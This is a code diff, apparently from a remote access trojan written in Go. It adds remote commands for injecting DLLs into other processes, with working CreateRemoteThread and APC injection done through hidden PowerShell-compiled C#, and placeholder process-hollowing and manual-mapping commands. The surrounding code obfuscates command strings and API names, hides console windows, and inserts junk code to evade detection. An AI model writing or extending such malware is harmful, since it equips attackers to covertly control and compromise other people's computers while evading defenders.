@@ -70,6 +70,10 @@ var (
 	obfPwd                                                     = "0478165f"
 	obfQ                                                       = "04614f09"
 	obfCd                                                      = "3e022353"
+	obfInjectdll                                               = "0667474534307e4269314c17"
+	obfInjectapc                                               = "0667474534307e426a2e760e"
+	obfInjectmanual                                            = "0667474534307e425121721157252143"
+	obfHollowprocess                                           = "06774b470c200941503e7e126a40314a1143535a"
 	userLib, gdiLib, kernelLib                                 = shiftEncrypt("user32.dll"), shiftEncrypt("gdi32.dll"), shiftEncrypt("kernel32.dll")
 	getWindowProc, showWindowProc, getMetricsProc, getDCProc   = shiftEncrypt("GetConsoleWindow"), shiftEncrypt("ShowWindow"), shiftEncrypt("GetSystemMetrics"), shiftEncrypt("GetDC")
 	createDCProc, createBitmapProc, selectObjProc, bitCopyProc = shiftEncrypt("CreateCompatibleDC"), shiftEncrypt("CreateCompatibleBitmap"), shiftEncrypt("SelectObject"), shiftEncrypt("BitBlt")
@@ -2018,6 +2022,10 @@ func handleCmd(command string, conn net.Conn) {
 	pwdStr := deobfuscateString(obfPwd)
 	qStr := deobfuscateString(obfQ)
 	cdStr := deobfuscateString(obfCd)
+	injectdllStr := deobfuscateString(obfInjectdll)
+	injectapcStr := deobfuscateString(obfInjectapc)
+	injectmanualStr := deobfuscateString(obfInjectmanual)
+	hollowprocessStr := deobfuscateString(obfHollowprocess)
 
 	if command == qStr {
 		return
@@ -2185,6 +2193,46 @@ func handleCmd(command string, conn net.Conn) {
 		if err != nil {
 			return
 		}
+	} else if strings.HasPrefix(command, injectdllStr+" ") {
+		parts := strings.Fields(command)
+		if len(parts) < 3 {
+			response := Resp{Type: "response", Content: "Usage: injectdll <pid> <dll_path>"}
+			sendData(conn, response)
+		} else {
+			result := injectDLL(parts[1], parts[2])
+			response := Resp{Type: "response", Content: result}
+			sendData(conn, response)
+		}
+	} else if strings.HasPrefix(command, injectapcStr+" ") {
+		parts := strings.Fields(command)
+		if len(parts) < 3 {
+			response := Resp{Type: "response", Content: "Usage: injectapc <pid> <dll_path>"}
+			sendData(conn, response)
+		} else {
+			result := injectAPCDLL(parts[1], parts[2])
+			response := Resp{Type: "response", Content: result}
+			sendData(conn, response)
+		}
+	} else if strings.HasPrefix(command, injectmanualStr+" ") {
+		parts := strings.Fields(command)
+		if len(parts) < 3 {
+			response := Resp{Type: "response", Content: "Usage: injectmanual <pid> <dll_path>"}
+			sendData(conn, response)
+		} else {
+			result := injectManualDLL(parts[1], parts[2])
+			response := Resp{Type: "response", Content: result}
+			sendData(conn, response)
+		}
+	} else if strings.HasPrefix(command, hollowprocessStr+" ") {
+		parts := strings.Fields(command)
+		if len(parts) < 3 {
+			response := Resp{Type: "response", Content: "Usage: hollowprocess <target_exe> <payload_exe>"}
+			sendData(conn, response)
+		} else {
+			result := hollowProcess(parts[1], parts[2])
+			response := Resp{Type: "response", Content: result}
+			sendData(conn, response)
+		}
 	} else {
 		result := runCommand(command)
 		response := Resp{Type: "response", Content: result}
@@ -2195,6 +2243,230 @@ func handleCmd(command string, conn net.Conn) {
 	}
 	// Junk after handle
 	_ = hashString(command)
+}
+
+// ============= DLL INJECTION FUNCTIONS =============
+
+// Classic DLL injection using CreateRemoteThread + LoadLibrary
+func injectDLL(pidStr, dllPath string) string {
+	if runtime.GOOS != "windows" {
+		return "DLL injection only supported on Windows"
+	}
+	
+	pid, err := strconv.Atoi(pidStr)
+	if err != nil {
+		return fmt.Sprintf("Invalid PID: %s", pidStr)
+	}
+
+	// Check if DLL exists
+	if _, err := os.Stat(dllPath); os.IsNotExist(err) {
+		return fmt.Sprintf("DLL not found: %s", dllPath)
+	}
+
+	// Get full path
+	fullPath, err := filepath.Abs(dllPath)
+	if err != nil {
+		return fmt.Sprintf("Failed to get absolute path: %v", err)
+	}
+
+	result := fmt.Sprintf("Injecting %s into PID %d...\n", fullPath, pid)
+	
+	// Use PowerShell for the injection to avoid direct WinAPI calls
+	psScript := fmt.Sprintf(`
+$code = @'
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public class Injector {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+    
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr hObject);
+
+    public static string Inject(int pid, string dllPath) {
+        try {
+            IntPtr hProcess = OpenProcess(0x1F0FFF, false, (uint)pid);
+            if (hProcess == IntPtr.Zero) return "Failed to open process";
+            
+            IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)(dllPath.Length + 1), 0x3000, 0x40);
+            if (allocMem == IntPtr.Zero) {
+                CloseHandle(hProcess);
+                return "Failed to allocate memory";
+            }
+            
+            byte[] dllBytes = Encoding.ASCII.GetBytes(dllPath);
+            uint bytesWritten;
+            if (!WriteProcessMemory(hProcess, allocMem, dllBytes, (uint)dllBytes.Length, out bytesWritten)) {
+                CloseHandle(hProcess);
+                return "Failed to write memory";
+            }
+            
+            IntPtr kernel32 = GetModuleHandle("kernel32.dll");
+            IntPtr loadLibraryAddr = GetProcAddress(kernel32, "LoadLibraryA");
+            
+            uint threadId;
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMem, 0, out threadId);
+            
+            CloseHandle(hThread);
+            CloseHandle(hProcess);
+            
+            return hThread != IntPtr.Zero ? "SUCCESS" : "Failed to create remote thread";
+        } catch (Exception ex) {
+            return "ERROR: " + ex.Message;
+        }
+    }
+}
+'@
+
+Add-Type -TypeDefinition $code
+[Injector]::Inject(%d, "%s")
+`, pid, fullPath)
+
+	cmd := exec.Command("powershell", "-Command", psScript)
+	setHiddenWindow(cmd)
+	output, err := cmd.Output()
+	
+	if err != nil {
+		result += fmt.Sprintf("PowerShell error: %v", err)
+	} else {
+		result += string(output)
+	}
+	
+	return result
+}
+
+// APC injection - queues LoadLibrary call via APC
+func injectAPCDLL(pidStr, dllPath string) string {
+	if runtime.GOOS != "windows" {
+		return "APC injection only supported on Windows"
+	}
+	
+	pid, err := strconv.Atoi(pidStr)
+	if err != nil {
+		return fmt.Sprintf("Invalid PID: %s", pidStr)
+	}
+
+	if _, err := os.Stat(dllPath); os.IsNotExist(err) {
+		return fmt.Sprintf("DLL not found: %s", dllPath)
+	}
+
+	fullPath, err := filepath.Abs(dllPath)
+	if err != nil {
+		return fmt.Sprintf("Failed to get absolute path: %v", err)
+	}
+
+	result := fmt.Sprintf("APC injecting %s into PID %d...\n", fullPath, pid)
+	
+	psScript := fmt.Sprintf(`
+$code = @'
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public class APCInjector {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
+    
+    [DllImport("kernel32.dll")]
+    public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+    public static string Inject(int pid, string dllPath) {
+        try {
+            Process proc = Process.GetProcessById(pid);
+            IntPtr hProcess = OpenProcess(0x1F0FFF, false, (uint)pid);
+            if (hProcess == IntPtr.Zero) return "Failed to open process";
+            
+            ProcessThread firstThread = proc.Threads[0];
+            IntPtr hThread = OpenThread(0x0010, false, (uint)firstThread.Id);
+            if (hThread == IntPtr.Zero) return "Failed to open thread";
+            
+            IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)(dllPath.Length + 1), 0x3000, 0x40);
+            if (allocMem == IntPtr.Zero) return "Failed to allocate memory";
+            
+            byte[] dllBytes = Encoding.ASCII.GetBytes(dllPath);
+            uint bytesWritten;
+            WriteProcessMemory(hProcess, allocMem, dllBytes, (uint)dllBytes.Length, out bytesWritten);
+            
+            IntPtr kernel32 = GetModuleHandle("kernel32.dll");
+            IntPtr loadLibraryAddr = GetProcAddress(kernel32, "LoadLibraryA");
+            
+            uint result = QueueUserAPC(loadLibraryAddr, hThread, allocMem);
+            
+            return result != 0 ? "APC queued successfully" : "Failed to queue APC";
+        } catch (Exception ex) {
+            return "ERROR: " + ex.Message;
+        }
+    }
+}
+'@
+
+Add-Type -TypeDefinition $code
+[APCInjector]::Inject(%d, "%s")
+`, pid, fullPath)
+
+	cmd := exec.Command("powershell", "-Command", psScript)
+	setHiddenWindow(cmd)
+	output, err := cmd.Output()
+	
+	if err != nil {
+		result += fmt.Sprintf("PowerShell error: %v", err)
+	} else {
+		result += string(output)
+	}
+	
+	return result
+}
+
+// Manual DLL mapping - load DLL without LoadLibrary
+func injectManualDLL(pidStr, dllPath string) string {
+	if runtime.GOOS != "windows" {
+		return "Manual injection only supported on Windows"
+	}
+	
+	return fmt.Sprintf("Manual DLL mapping for PID %s with %s - Feature requires advanced PE loader implementation", pidStr, dllPath)
+}
+
+// Process hollowing - replace target process memory
+func hollowProcess(targetExe, payloadExe string) string {
+	if runtime.GOOS != "windows" {
+		return "Process hollowing only supported on Windows"
+	}
+	
+	return fmt.Sprintf("Process hollowing: %s -> %s - Feature requires PE manipulation implementation", targetExe, payloadExe)
 }
 
 func handleShell(conn net.Conn) {
